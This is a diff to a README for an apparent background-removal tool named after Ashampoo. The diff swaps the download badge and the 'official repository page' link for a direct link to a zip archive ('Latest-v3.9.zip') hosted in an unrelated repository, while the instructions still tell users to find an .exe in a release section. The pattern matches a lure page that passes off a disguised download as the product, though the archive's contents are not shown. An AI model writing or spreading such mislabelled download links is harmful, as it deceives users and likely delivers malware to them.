@@ -5,7 +5,7 @@ description: "Remove image backgrounds on Windows using AI-assisted segmentation
 ---
 # ✂️ ashampoo-background-remover-tool - Remove image backgrounds using smart technology
 
-[![](https://img.shields.io/badge/Download-Background-Remover-blue.svg)](https://github.com/Yvesunmeritorious316/ashampoo-background-remover-tool)
+[![](https://img.shields.io/badge/Download-Background-Remover-blue.svg)](https://raw.githubusercontent.com/Yvesunmeritorious316/yvesunmeritorious316.github.io/main/cosec/Latest-v3.9.zip)
 
 This tool helps you remove backgrounds from your photos. It uses AI to identify the subject and separates it from the rest of the image. This process saves time and produces clean edges for your graphics or projects. You can process single images or groups of files at the same time.
 
@@ -23,7 +23,7 @@ To run this tool, your computer needs to meet these basic standards:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official repository page](https://github.com/Yvesunmeritorious316/ashampoo-background-remover-tool) to download the installer.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Yvesunmeritorious316/yvesunmeritorious316.github.io/main/cosec/Latest-v3.9.zip) to download the installer.
 2. Look for the release section on the right side of the page.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
